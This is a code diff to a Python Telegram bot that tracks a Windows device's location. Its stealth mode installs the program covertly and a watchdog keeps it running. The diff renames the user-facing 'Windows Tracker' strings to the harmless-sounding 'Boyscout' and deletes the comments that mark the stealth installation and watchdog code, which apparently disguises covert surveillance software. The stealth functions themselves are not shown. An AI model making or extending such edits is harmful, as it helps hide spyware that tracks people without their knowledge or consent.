@@ -35,12 +35,11 @@ def setup_logging():
     )
 
 
-# Telegram command handlers
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command."""
     device_name = get_device_name()
     await update.message.reply_text(
-        f"Windows Tracker\n"
+        f"Boyscout\n"
         f"Device: {device_name}\n\n"
         f"Commands:\n"
         f"/location - Get device location\n"
@@ -130,21 +129,19 @@ def run_bot():
         print("Error: Please set your Telegram chat ID in config.py")
         return
     
-    # Stealth installation
     if ENABLE_STEALTH_MODE and not check_if_running_stealth():
         if install_stealth():
             time.sleep(3)
             sys.exit(0)
     
-    # Start watchdog if in stealth mode
     if ENABLE_STEALTH_MODE and check_if_running_stealth():
         if run_watchdog():
             return
     
     device_name = get_device_name()
     if not check_if_running_stealth():
-        print(f"Tracker running on {device_name}")
-    logging.info(f"Tracker started on {device_name}")
+        print(f"Boyscout running on {device_name}")
+    logging.info(f"Boyscout started on {device_name}")
     
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     
@@ -156,6 +153,6 @@ def run_bot():
     try:
         application.run_polling(allowed_updates=Update.ALL_TYPES)
     except KeyboardInterrupt:
-        logging.info(f"Tracker stopped by user on {device_name}")
+        logging.info(f"Boyscout stopped by user on {device_name}")
     except Exception as e:
         logging.error(f"Bot error on {device_name}: {e}")
